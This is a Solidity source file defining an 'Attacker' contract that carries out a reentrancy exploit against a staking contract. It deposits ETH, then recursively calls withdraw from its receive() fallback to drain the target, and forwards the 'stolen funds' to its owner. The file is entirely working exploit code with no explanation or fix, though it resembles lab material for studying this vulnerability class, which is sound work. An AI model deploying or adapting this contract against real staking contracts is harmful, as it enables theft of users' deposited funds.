// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableStaking {
    function stake() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {

    IVulnerableStaking public staking;
    address public owner;

    constructor(address _stakingAddress) {
        staking = IVulnerableStaking(_stakingAddress);
        owner = msg.sender;
    }

    // Start attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Step 1: deposit
        staking.stake{value: msg.value}();

        // Step 2: withdraw to trigger reentrancy
        staking.withdraw(msg.value);
    }

    // This gets triggered when contract receives ETH
    receive() external payable {
        if (address(staking).balance >= 1 ether) {
            staking.withdraw(1 ether);
        }
    }

    // Withdraw stolen funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}